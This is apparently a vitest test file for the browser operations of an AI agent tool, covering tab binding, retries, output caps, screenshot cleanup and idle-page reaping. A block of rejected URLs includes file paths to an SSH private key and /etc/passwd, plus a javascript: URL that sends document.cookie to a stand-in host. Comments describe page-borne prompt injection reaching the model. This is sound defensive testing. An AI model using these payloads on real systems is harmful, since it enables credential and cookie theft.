import { describe, expect, it } from "vitest";
import type { RunArgs, RunResult } from "./engine.js";
import {
  createOperations,
  MAX_OUTPUT_CHARS,
  MAX_SCREENSHOT_BYTES,
} from "./operations.js";

type Runner = (args: RunArgs) => Promise<RunResult>;

/**
 * A stand-in agent-browser that understands only as much of `batch` as this
 * module produces: it decodes the JSON command list off stdin, echoes back
 * the readiness marker the way `eval` of a string literal would, and hands
 * the last command to the test's own runner. `bindsWith` drives whether the
 * marker comes back at all — that is what distinguishes "this session lost
 * its tab" from "the command failed", and both paths are exercised below.
 */
function opsWith(
  run: Runner | string = "ok",
  options: { forgetLabel?: boolean; neverBinds?: boolean } = {},
) {
  const runs: RunArgs[] = [];
  let labelKnown = !(options.forgetLabel || options.neverBinds);
  const rebinds: string[] = [];
  const engine = {
    run: async (args: RunArgs) => {
      runs.push(args);
      const steps = JSON.parse(args.stdin ?? "[]") as string[][];
      const marker = JSON.parse(steps[2]?.[1] ?? '""') as string;
      const argv = steps[3] ?? [];
      if (!labelKnown) {
        // Exactly what the binary does: --bail stops the batch, the real
        // command never runs, and the marker never reaches stdout.
        return { stdout: "✓ Done", stderr: "No tab with label `bbpage`", code: 1 } as RunResult;
      }
      const inner =
        typeof run === "string"
          ? ({ stdout: run, stderr: "", code: 0 } as RunResult)
          : await run({ ...args, argv });
      return {
        stdout: `✓ Done\n\n✓\n\n"${marker}"\n\n${inner.stdout}`,
        stderr: inner.stderr,
        code: inner.code,
      } as RunResult;
    },
    browserCdpUrl: async () => "ws://127.0.0.1:1/devtools/browser/x",
    shutdown: async () => {},
    shutdownAll: async () => {},
  };
  const closed: string[] = [];
  const binding = {
    cdpUrl: "ws://127.0.0.1:1/devtools/page/p1",
    browserWsUrl: "ws://127.0.0.1:1/devtools/browser/x",
    tab: "bbpage",
  };
  const pages = {
    pageUrlFor: async () => binding.cdpUrl,
    bindingFor: async () => binding,
    rebind: async (sessionKey: string) => {
      rebinds.push(sessionKey);
      if (!options.neverBinds) labelKnown = true;
      return binding;
    },
    existingPageUrl: async () => null,
    existingPageInfo: async () => null,
    listOpenPages: async () => [],
    closeUnboundPage: async () => {},
    shutdownBrowser: async () => {},
    shutdownAllBrowsers: async () => {},
    closePage: async (sessionKey: string) => {
      closed.push(sessionKey);
    },
    forget: async () => {},
  };
  // Every call the reaper is told about, in order — "watch thr_a", "touch
  // thr_a" and so on. Order is the whole point: a hold taken after the
  // command has already run would not protect it.
  const activity: string[] = [];
  return {
    runs,
    closed,
    rebinds,
    activity,
    /** The batch steps of every invocation. */
    get batches() {
      return runs.map((args) => JSON.parse(args.stdin ?? "[]") as string[][]);
    },
    /** The real command of every invocation — the last step of its batch. */
    get calls() {
      return this.batches.map((steps) => steps[3] ?? []);
    },
    operations: createOperations({
      engine,
      pages,
      profileFor: async () => "main",
      activity: {
        touch: (sessionKey: string) => activity.push(`touch ${sessionKey}`),
        watch: (sessionKey: string) => activity.push(`watch ${sessionKey}`),
        unwatch: (sessionKey: string) => activity.push(`unwatch ${sessionKey}`),
        forget: (sessionKey: string) => activity.push(`forget ${sessionKey}`),
      },
    }),
  };
}

describe("operations", () => {
  // Selecting the tab and acting on it have to be ONE invocation. Measured
  // against agent-browser 0.33.2: any new page appearing in the browser —
  // including a background tab another thread opens over CDP — silently
  // replaces every session's selected tab, so a select in its own spawn is
  // a select that another thread can undo before the command lands.
  it("connects, selects this thread's tab and acts in a single invocation", async () => {
    const ops = opsWith();
    await ops.operations.open("thr_a", "https://example.com");
    expect(ops.runs).toHaveLength(1);
    expect(ops.runs[0]!.argv).toEqual(["batch", "--bail"]);
    expect(ops.batches[0]).toEqual([
      ["connect", "ws://127.0.0.1:1/devtools/browser/x"],
      ["tab", "bbpage"],
      ["eval", expect.stringMatching(/^"bbready-/)],
      ["open", "https://example.com"],
    ]);
  });

  // A session whose daemon was restarted has no browser and no labels. Left
  // to itself it launches a Chromium of its own on a throwaway profile
  // (measured) — a stray, logged-out browser nothing ever closes.
  it("connects on every command, not only the first", async () => {
    const ops = opsWith();
    await ops.operations.read("thr_a");
    await ops.operations.read("thr_a");
    for (const steps of ops.batches) expect(steps[0]![0]).toBe("connect");
  });

  it("rebinds and retries once when the session has lost its tab", async () => {
    const ops = opsWith("ok", { forgetLabel: true });
    await expect(ops.operations.read("thr_a")).resolves.toBe("ok");
    expect(ops.rebinds).toEqual(["thr_a"]);
    expect(ops.runs).toHaveLength(2);
  });

  it("gives up rather than retrying forever when rebinding does not help", async () => {
    const ops = opsWith("ok", { neverBinds: true });
    await expect(ops.operations.read("thr_a")).rejects.toThrow(/could not put this thread on its own page/);
    expect(ops.runs).toHaveLength(2);
  });

  // `--bail` (asserted above) is what makes the retry safe: the real command
  // is the step AFTER the tab select, so a failed select stops the batch
  // before it, and a retry cannot repeat a navigation or a click. What this
  // test adds is that the retry's output is the command's own, not a
  // leftover fragment of the failed attempt.
  it("returns the retried command's own output after a rebind", async () => {
    const ops = opsWith(
      async ({ argv }) => ({ stdout: `ran ${argv.join(" ")}`, stderr: "", code: 0 }),
      { forgetLabel: true },
    );
    const text = await ops.operations.read("thr_a");
    expect(text).toBe("ran read");
  });

  // A thread session that passes --profile makes Chromium abort on the
  // profile directory another process already holds ("Failed to create a
  // ProcessSingleton for your profile directory"), killing the session for
  // every later command. Measured against agent-browser 0.33.2. Launch mode
  // belongs to the control session alone, so BOTH the bind and the command
  // that follows it must attach.
  it("never launches a browser from a thread session", async () => {
    const ops = opsWith();
    await ops.operations.type("thr_a", "#q", "hello", true);
    expect(ops.runs.length).toBeGreaterThan(1);
    for (const args of ops.runs) expect(args.attach).toBe(true);
  });

  it("passes the resolved profile and session to every run", async () => {
    const ops = opsWith();
    await ops.operations.read("thr_a");
    for (const args of ops.runs) {
      expect(args.profile).toBe("main");
      expect(args.session).toBe("thr_a");
    }
  });

  it("reads page text", async () => {
    const ops = opsWith("Example Domain");
    const text = await ops.operations.read("thr_a");
    expect(ops.calls[0]).toEqual(["read"]);
    // The cap is a GLOBAL flag: inside a batch a step carrying it is rejected
    // ("Unknown subcommand: --max-output"), so it rides on the invocation.
    expect(ops.runs[0]!.maxOutput).toBe(MAX_OUTPUT_CHARS);
    expect(text).toBe("Example Domain");
  });

  it("asks for an interactive snapshot when requested", async () => {
    const ops = opsWith();
    await ops.operations.snapshot("thr_a", true);
    expect(ops.calls[0]).toEqual(["snapshot", "-i"]);
    expect(ops.runs[0]!.maxOutput).toBe(MAX_OUTPUT_CHARS);
  });

  it("asks for the full snapshot when not", async () => {
    const ops = opsWith();
    await ops.operations.snapshot("thr_a", false);
    expect(ops.calls[0]).toEqual(["snapshot"]);
    expect(ops.runs[0]!.maxOutput).toBe(MAX_OUTPUT_CHARS);
  });

  it("types and submits in one call", async () => {
    const ops = opsWith();
    await ops.operations.type("thr_a", "#q", "hello", true);
    expect(ops.calls[0]).toEqual(["fill", "#q", "hello"]);
    expect(ops.calls[1]).toEqual(["press", "Enter"]);
  });

  it("does not press Enter when submit is false", async () => {
    const ops = opsWith();
    await ops.operations.type("thr_a", "#q", "hello", false);
    expect(ops.calls.map((argv) => argv[0])).not.toContain("press");
  });

  it("returns a screenshot as base64", async () => {
    // The fake writes the PNG the real binary would write, so the read-back
    // path is exercised rather than stubbed.
    const png = Buffer.from([0x89, 0x50, 0x4e, 0x47]);
    const ops = opsWith(async ({ argv }) => {
      if (argv[0] === "screenshot") {
        await import("node:fs/promises").then((fs) => fs.writeFile(argv[1], png));
      }
      return { stdout: "ok", stderr: "", code: 0 };
    });
    const shot = await ops.operations.screenshot("thr_a");
    expect(typeof shot.base64).toBe("string");
    expect(shot.base64).toBe(png.toString("base64"));
  });

  it("cleans up the screenshot temp file after a successful capture", async () => {
    // The failure case below cannot prove this on its own: when the command
    // fails the fake never writes the file, so the existence check passes
    // whether or not anything cleans up. Only the success path — where a PNG
    // really lands on disk — can tell "removed it" from "never created it".
    // Without this, every screenshot leaks a PNG of page content into tmpdir
    // for the life of the machine.
    let path = "";
    const png = Buffer.from([0x89, 0x50, 0x4e, 0x47]);
    const ops = opsWith(async ({ argv }) => {
      if (argv[0] === "screenshot") {
        path = argv[1];
        await import("node:fs/promises").then((fs) => fs.writeFile(argv[1], png));
      }
      return { stdout: "ok", stderr: "", code: 0 };
    });
    const shot = await ops.operations.screenshot("thr_a");
    expect(shot.base64).toBe(png.toString("base64"));
    const { existsSync } = await import("node:fs");
    expect(path).not.toBe("");
    expect(existsSync(path)).toBe(false);
  });

  it("cleans up the screenshot temp file even when the command fails", async () => {
    let path = "";
    const ops = opsWith(async ({ argv }) => {
      if (argv[0] === "screenshot") {
        path = argv[1];
        return { stdout: "", stderr: "screenshot failed", code: 1 };
      }
      return { stdout: "ok", stderr: "", code: 0 };
    });
    await expect(ops.operations.screenshot("thr_a")).rejects.toThrow(/screenshot failed/);
    const { existsSync } = await import("node:fs");
    expect(existsSync(path)).toBe(false);
  });

  it("closes this thread's page without touching the browser", async () => {
    const ops = opsWith();
    await ops.operations.close("thr_a");
    expect(ops.closed).toEqual(["thr_a"]);
    expect(ops.calls).toEqual([]);
  });

  it("surfaces a failing command as an error", async () => {
    const ops = opsWith(async () => ({ stdout: "", stderr: "no such element", code: 1 }));
    await expect(ops.operations.click("thr_a", "#gone")).rejects.toThrow(/no such element/);
    // The command's own failure, not a binding failure — no retry.
    expect(ops.rebinds).toEqual([]);
  });

  // file:// + read is a local-file exfiltration path, reachable by injection
  // from any page the agent is already reading. javascript:/data: execute
  // attacker-authored script in the tab's origin. Enforced in Operations so
  // the CLI inherits it rather than re-implementing it.
  describe("refuses to open anything that is not http or https", () => {
    const rejected = [
      "file:///Users/mgrin/.ssh/id_rsa",
      "file:///etc/passwd",
      "javascript:fetch('https://evil.test/'+document.cookie)",
      "data:text/html,<script>alert(1)</script>",
      "about:blank",
      "chrome://settings",
      "view-source:https://example.com",
      "ftp://example.com/secret.txt",
      "ws://127.0.0.1:9222/devtools/browser/abc",
      "blob:https://example.com/1234",
    ];

    for (const url of rejected) {
      it(`rejects ${url}`, async () => {
        const ops = opsWith();
        await expect(ops.operations.open("thr_a", url)).rejects.toThrow(/only opens http/i);
        // and never reached the browser at all
        expect(ops.calls).toEqual([]);
      });
    }

    it("rejects a string that is not a url", async () => {
      const ops = opsWith();
      await expect(ops.operations.open("thr_a", "not a url")).rejects.toThrow(/not a valid url/i);
      expect(ops.calls).toEqual([]);
    });

    for (const url of ["https://example.com/", "http://localhost:3000/x?y=1#z"]) {
      it(`still opens ${url}`, async () => {
        const ops = opsWith();
        await ops.operations.open("thr_a", url);
        expect(ops.calls[0]).toEqual(["open", url]);
      });
    }
  });

  it("refuses a screenshot larger than the byte cap", async () => {
    const huge = Buffer.alloc(MAX_SCREENSHOT_BYTES + 1, 0x41);
    const ops = opsWith(async ({ argv }) => {
      if (argv[0] === "screenshot") {
        await import("node:fs/promises").then((fs) => fs.writeFile(argv[1], huge));
      }
      return { stdout: "ok", stderr: "", code: 0 };
    });
    await expect(ops.operations.screenshot("thr_a")).rejects.toThrow(/over the .*-byte limit/);
  });

  // `open` returns the page's <title>, which the page writes — so it is
  // page-controlled text like `read` is, and it was the one such command
  // left uncapped: a hostile title reached the model through execFile's
  // 32MB buffer. It is also the FIRST thing a hostile page ever gets to
  // answer, which is what makes it the wrong one to have missed.
  it("caps the title an opened page returns", async () => {
    const ops = opsWith();
    await ops.operations.open("thr_a", "https://example.com/");
    expect(ops.calls[0]).toEqual(["open", "https://example.com/"]);
    expect(ops.runs[0]!.maxOutput).toBe(MAX_OUTPUT_CHARS);
  });

  it("does not cap commands whose output the page does not control", async () => {
    const ops = opsWith();
    await ops.operations.click("thr_a", "#go");
    expect(ops.calls[0]).toEqual(["click", "#go"]);
    // Asserted, not merely unasserted: the exemption is a real decision,
    // and a test that only checks the argv passes whether or not the cap
    // is applied.
    expect(ops.runs[0]!.maxOutput).toBeUndefined();
  });

  it("says so, naming the reason, when it cannot reach this thread's page at all", async () => {
    const ops = opsWith("ok", { neverBinds: true });
    await expect(ops.operations.read("thr_a")).rejects.toThrow(
      /could not put this thread on its own page.*No tab with label/s,
    );
  });
});

// The reaper closes pages nobody has used lately. "Lately" has to mean real
// command activity, not just panel traffic — otherwise an agent working a
// long task through the tools is invisible to it, and its page gets closed
// mid-work.
describe("operations tell the reaper the page is in use", () => {
  it("holds the page for the whole of a command, then restarts its idle clock", async () => {
    const ops = opsWith();
    await ops.operations.read("thr_a");
    expect(ops.activity).toEqual(["watch thr_a", "touch thr_a", "unwatch thr_a"]);
  });

  // The discriminating part: a touch on its own only moves a timestamp, and
  // a command that runs longer than the idle timeout would still be reaped
  // half way through. The hold has to be open while the invocation runs.
  it("keeps the hold open for as long as the command is running", async () => {
    let heldDuringRun: string[] = [];
    const ops = opsWith(async () => {
      heldDuringRun = [...ops.activity];
      return { stdout: "ok", stderr: "", code: 0 };
    });
    await ops.operations.read("thr_a");
    expect(heldDuringRun).toEqual(["watch thr_a"]);
  });

  it("releases the hold when the command fails", async () => {
    const ops = opsWith("ok", { neverBinds: true });
    await expect(ops.operations.read("thr_a")).rejects.toThrow();
    expect(ops.activity).toEqual(["watch thr_a", "touch thr_a", "unwatch thr_a"]);
  });

  it("holds the page across a rebind and its retry, not just the first attempt", async () => {
    const ops = opsWith("ok", { forgetLabel: true });
    await ops.operations.read("thr_a");
    expect(ops.rebinds).toEqual(["thr_a"]);
    expect(ops.activity).toEqual(["watch thr_a", "touch thr_a", "unwatch thr_a"]);
  });

  // Closing on purpose is the one case where there is nothing left to reap:
  // leaving the session tracked would have the next sweep try to close a
  // page that is already gone, once a minute, forever.
  it("stops tracking a session whose page was closed on purpose", async () => {
    const ops = opsWith();
    await ops.operations.close("thr_a");
    expect(ops.closed).toEqual(["thr_a"]);
    expect(ops.activity).toEqual(["forget thr_a"]);
  });
});
